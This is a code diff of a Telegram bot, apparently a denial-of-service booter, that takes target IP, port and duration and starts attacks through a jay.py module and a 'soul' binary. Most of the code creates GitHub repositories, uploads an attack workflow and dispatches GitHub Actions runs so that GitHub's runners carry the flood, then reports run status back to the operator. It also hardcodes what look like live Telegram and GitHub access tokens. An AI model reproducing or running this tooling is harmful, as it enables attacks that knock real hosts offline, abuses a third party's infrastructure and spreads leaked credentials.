@@ -8,17 +8,17 @@ import requests
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 from telegram import Update
 
-TELEGRAM_TOKEN = "7788865701:AAHFVFbSdhpRuMTmLj987J8BmwKLR3j4brk"
-ADMIN_ID = 7163028849
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "7788865701:AAHFVFbSdhpRuMTmLj987J8BmwKLR3j4brk")
+ADMIN_ID = 1600832237
 BOT_OWNER = "SOULCRACK"
 
-# GitHub configuration
-GITHUB_TOKENS = ["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", "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", "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", "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"]  # Add your GitHub tokens here
+# GitHub configuration - Use environment variables for security
+GITHUB_TOKENS = os.getenv("GITHUB_TOKENS", "").split(",") if os.getenv("GITHUB_TOKENS") else ["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", "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", "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"]
 current_token_index = 0
 
 approved_users = {}
 active_attacks = {}
-github_repos = {}  # Store repo info: {repo_name: {"url": url, "token": token, "workflow_runs": []}}
+github_repos = {}
 
 def is_admin(user_id: int):
     return user_id == ADMIN_ID
@@ -30,8 +30,9 @@ def approve_user(user_id: int):
     approved_users[user_id] = True
 
 def get_next_github_token():
-    """Round-robin through available GitHub tokens"""
     global current_token_index
+    if not GITHUB_TOKENS:
+        return None
     token = GITHUB_TOKENS[current_token_index]
     current_token_index = (current_token_index + 1) % len(GITHUB_TOKENS)
     return token
@@ -69,17 +70,17 @@ async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     repo_name = context.args[0]
     description = " ".join(context.args[1:]) if len(context.args) > 1 else "Attack repository"
     
-    # Check if repo already exists
     if repo_name in github_repos:
         await update.message.reply_text(f"⚠️ Repository '{repo_name}' already exists.")
         return
     
+    token = get_next_github_token()
+    if not token:
+        await update.message.reply_text("❌ No GitHub tokens available.")
+        return
+    
     await update.message.reply_text(f"🔄 Creating repository '{repo_name}'...")
     
-    # Get GitHub token
-    token = get_next_github_token()
-    
-    # Create repository
     create_url = "https://api.github.com/user/repos"
     headers = {
         "Authorization": f"token {token}",
@@ -100,54 +101,46 @@ async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         repo_info = response.json()
         repo_url = repo_info["html_url"]
-        clone_url = repo_info["clone_url"]
+        owner_login = repo_info["owner"]["login"]
         
-        # Upload files
         await update.message.reply_text("🔄 Uploading files...")
         
-        # Read and encode files
         files_to_upload = {
+            "bot.py": open("bot.py", "rb").read(),
             "jay.py": open("jay.py", "rb").read(),
-            "jay.yml": open("jay.yml", "rb").read(),
-            "soul": open("soul", "rb").read()
+            "soul": open("soul", "rb").read(),
+            "requirements.txt": open("requirements.txt", "rb").read(),
+            "README.md": "# Attack Bot\n\nThis repository contains the attack bot system.".encode('utf-8')
         }
         
-        # Create .github/workflows directory and upload jay.yml there
-        workflow_dir_url = f"https://api.github.com/repos/{repo_info['owner']['login']}/{repo_name}/contents/.github/workflows/jay.yml"
-        
         # Upload jay.yml to workflows directory
-        workflow_content = base64.b64encode(files_to_upload["jay.yml"]).decode('utf-8')
+        workflow_content = open(".github/workflows/jay.yml", "rb").read()
+        workflow_dir_url = f"https://api.github.com/repos/{owner_login}/{repo_name}/contents/.github/workflows/jay.yml"
         workflow_data = {
             "message": "Add workflow file",
-            "content": workflow_content
+            "content": base64.b64encode(workflow_content).decode('utf-8')
         }
         
         response = requests.put(workflow_dir_url, headers=headers, json=workflow_data)
         if response.status_code not in [200, 201]:
-            await update.message.reply_text(f"⚠️ Could not create workflow directory: {response.json().get('message', 'Unknown error')}")
+            await update.message.reply_text(f"⚠️ Could not create workflow: {response.json().get('message', 'Unknown error')}")
         
-        # Upload other files to root
+        # Upload other files
         for filename, content in files_to_upload.items():
-            if filename == "jay.yml":
-                continue  # Already uploaded to workflows directory
-                
-            file_url = f"https://api.github.com/repos/{repo_info['owner']['login']}/{repo_name}/contents/{filename}"
-            file_content = base64.b64encode(content).decode('utf-8')
+            file_url = f"https://api.github.com/repos/{owner_login}/{repo_name}/contents/{filename}"
             file_data = {
                 "message": f"Add {filename}",
-                "content": file_content
+                "content": base64.b64encode(content).decode('utf-8')
             }
             
             response = requests.put(file_url, headers=headers, json=file_data)
             if response.status_code not in [200, 201]:
                 await update.message.reply_text(f"⚠️ Could not upload {filename}: {response.json().get('message', 'Unknown error')}")
         
-        # Store repo info
         github_repos[repo_name] = {
             "url": repo_url,
-            "clone_url": clone_url,
             "token": token,
-            "owner": repo_info['owner']['login'],
+            "owner": owner_login,
             "workflow_runs": []
         }
         
@@ -172,22 +165,18 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("⚠️ Invalid time.")
         return
     
-    # Check if we have any GitHub repositories
     if not github_repos:
         await update.message.reply_text("❌ No GitHub repositories available. Use /upload first.")
         return
     
-    # Select a repository (for simplicity, use the first one)
     repo_name = list(github_repos.keys())[0]
     repo_info = github_repos[repo_name]
     
-    # Start the attack directly using jay.py functionality
     attack_id = f"{ip}:{port}:{time_s}"
     if attack_id in active_attacks:
         await update.message.reply_text("⚠️ This attack is already running.")
         return
     
-    # Import and use jay.py functions directly
     try:
         from jay import launch_attack
         success = launch_attack(ip, port, time_s)
@@ -200,7 +189,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'repo_name': repo_name
             }
             
-            # Trigger workflow dispatch
             await trigger_workflow_dispatch(repo_name, repo_info, ip, port, time_s)
             
             await update.message.reply_text(
@@ -209,10 +197,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"🔍 Monitoring workflows..."
             )
             
-            # Start monitoring workflow status
             asyncio.create_task(monitor_workflows(update, context, attack_id, repo_name))
-            
-            # Schedule a task to remove the attack from active_attacks after completion
             asyncio.create_task(attack_completion_notification(update, context, attack_id, time_int))
         else:
             await update.message.reply_text("⚠️ Failed to start attack.")
@@ -220,7 +205,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"⚠️ Error starting attack: {e}")
 
 async def trigger_workflow_dispatch(repo_name, repo_info, ip, port, time_s):
-    """Trigger workflow dispatch for the attack"""
     try:
         headers = {
             "Authorization": f"token {repo_info['token']}",
@@ -244,7 +228,6 @@ async def trigger_workflow_dispatch(repo_name, repo_info, ip, port, time_s):
         return False
 
 async def monitor_workflows(update, context, attack_id, repo_name):
-    """Monitor workflow status and send updates every 5 seconds"""
     if repo_name not in github_repos:
         return
     
@@ -259,7 +242,7 @@ async def monitor_workflows(update, context, attack_id, repo_name):
     start_time = time.time()
     duration = active_attacks[attack_id]['duration']
     
-    while time.time() - start_time < duration + 10:  # Monitor for duration + 10 seconds
+    while time.time() - start_time < duration + 10:
         if attack_id not in active_attacks:
             break
             
@@ -269,7 +252,6 @@ async def monitor_workflows(update, context, attack_id, repo_name):
                 workflow_data = response.json()
                 workflow_runs = workflow_data.get('workflow_runs', [])
                 
-                # Count statuses
                 status_counts = {
                     'queued': 0,
                     'in_progress': 0,
@@ -292,7 +274,6 @@ async def monitor_workflows(update, context, attack_id, repo_name):
                         else:
                             status_counts['failed'] += 1
                 
-                # Update message
                 status_message = (
                     f"📊 Workflow Status for {repo_name}:\n"
                     f"✅ Completed: {status_counts['completed']}\n"
@@ -302,7 +283,6 @@ async def monitor_workflows(update, context, attack_id, repo_name):
                     f"📈 Total: {status_counts['total']}"
                 )
                 
-                # Edit or send new message
                 if 'status_message_id' not in active_attacks[attack_id]:
                     message = await update.message.reply_text(status_message)
                     active_attacks[attack_id]['status_message_id'] = message.message_id
@@ -314,14 +294,12 @@ async def monitor_workflows(update, context, attack_id, repo_name):
                             text=status_message
                         )
                     except:
-                        # Message might not be editable, send new one
                         message = await update.message.reply_text(status_message)
                         active_attacks[attack_id]['status_message_id'] = message.message_id
                 
-                # Store workflow runs for later reference
                 github_repos[repo_name]['workflow_runs'] = workflow_runs
                 
-            await asyncio.sleep(5)  # Wait 5 seconds before next update
+            await asyncio.sleep(5)
         except Exception as e:
             print(f"Error monitoring workflows: {e}")
             await asyncio.sleep(5)
@@ -332,7 +310,6 @@ async def attack_completion_notification(update, context, attack_id, duration):
         ip, port, time_s = attack_id.split(':')
         await update.message.reply_text(f"✅ Attack finished on {ip}:{port}!")
         
-        # Clean up status message if it exists
         if 'status_message_id' in active_attacks[attack_id]:
             try:
                 await context.bot.delete_message(
@@ -356,14 +333,12 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     attack_id = context.args[0]
     if attack_id in active_attacks:
-        # Import and use jay.py functions directly to stop attack
         try:
             from jay import stop_attack
             ip, port, time_s = attack_id.split(':')
             success = stop_attack(ip, port)
             
             if success:
-                # Clean up status message if it exists
                 if 'status_message_id' in active_attacks[attack_id]:
                     try:
                         await context.bot.delete_message(
